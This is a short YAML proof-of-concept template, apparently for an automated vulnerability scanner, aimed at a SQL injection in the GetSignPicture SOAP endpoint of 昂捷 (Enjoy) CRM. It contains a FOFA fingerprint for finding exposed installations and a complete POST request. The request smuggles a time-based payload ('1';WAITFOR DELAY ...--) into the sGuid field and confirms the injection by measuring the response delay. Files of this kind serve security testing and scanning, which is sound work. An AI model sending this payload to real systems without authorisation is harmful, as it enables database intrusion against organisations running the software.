id: poc-yaml-enjoyrmis-getsignpicture-sqli
info:
  name: 昂捷CRM GetSignPicture SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: enjoyrmis
  fofa: body="CheckSilverlightInstalled"
variables:
  t1: random_int(3,8)
  t2: t1 + 2
requests:
- method: POST
  path: /enjoyRMIS_WS/WS/OA/CWSOffice.asmx
  headers:
    Content-Type: text/xml; charset=utf-8
    SOAPAction: '"http://tempuri.org/GetSignPicture"'
  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
    >\n  <soap:Body>\n    <GetSignPicture xmlns=\"http://tempuri.org/\">\n      <sGuid>1';WAITFOR\
    \ DELAY '0:0:{{.t1}}'--</sGuid>\n    </GetSignPicture>\n  </soap:Body>\n</soap:Envelope>"
  expression: "status_code == 200 && \ncontains(body,\"GetSignPictureResponse\") &&\n\
    contains(body,\"<sMsg>没有印章或签名记录</sMsg>\") &&\ncontains(content_type,\"text/xml\"\
    ) &&\nduration > t1 &&\nduration < t2\n"
transport: http
